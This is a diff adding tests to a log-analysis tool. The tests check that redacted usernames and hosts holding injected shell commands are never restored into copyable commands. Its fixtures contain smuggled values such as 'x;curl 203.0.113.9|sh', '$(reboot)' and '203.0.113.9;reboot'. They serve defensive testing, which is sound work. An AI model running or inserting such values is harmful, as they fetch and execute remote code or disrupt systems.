@@ -928,3 +928,51 @@ def test_an_older_database_gains_the_retry_columns(tmp_path):
         old, new = database.llm_calls()
         assert (old.try_number, old.rejected) == (1, None)
         assert (new.try_number, new.rejected) == (2, '{"summary": "x"}')
+
+
+# --- Commands are shown with a Copy button ----------------------------------------------------
+
+
+def test_a_hostile_username_is_never_put_back_into_a_command():
+    from netlog.redaction.redactor import Redactor
+
+    redactor = Redactor()
+    redactor.add_known("USER", ["x;curl 203.0.113.9|sh"])
+    redactor.add_known("HOST", ["srv1"])
+    text = redactor.redact_text("srv1 x;curl 203.0.113.9|sh")
+    user = next(t for t, v in redactor.mapping.items() if v.startswith("x;curl"))
+    host = next(t for t, v in redactor.mapping.items() if v == "srv1")
+    assert user in text and host in text
+
+    command = f"grep {user} /var/log/auth.log on {host}"
+    assert redactor.restore_command(command) == f"grep {user} /var/log/auth.log on srv1"
+    # Text that is not a command is restored in full, for reading.
+    assert "x;curl" in redactor.restore(command)
+
+
+def test_restoring_an_explanation_keeps_stand_ins_in_unsafe_commands():
+    from netlog.llm.explanation import VerificationCommand
+    from netlog.redaction.redactor import Redactor
+
+    redactor = Redactor()
+    redactor.add_known("USER", ["$(reboot)"])
+    redactor.redact_text("login by $(reboot)")
+    user = next(t for t, v in redactor.mapping.items() if v == "$(reboot)")
+    explanation = good()
+    explanation.verification_commands = [
+        VerificationCommand(command=f"last {user}", purpose=f"No session for {user}.")
+    ]
+
+    shown = restore_explanation(explanation, redactor)
+    assert shown.verification_commands[0].command == f"last {user}"
+    assert shown.verification_commands[0].purpose == "No session for $(reboot)."
+
+
+def test_a_template_drops_a_command_whose_value_is_not_plainly_a_name(brute):
+    data = copy.deepcopy(brute.data)
+    data["root_cause"]["entity"] = "203.0.113.9;reboot"
+    hostile = replace(brute, data=data)
+    commands = [c.command for c in fallback_explanation(hostile, "senior").verification_commands]
+    assert commands and not any("reboot" in c for c in commands)
+    plain = [c.command for c in fallback_explanation(brute, "senior").verification_commands]
+    assert len(plain) >= len(commands)
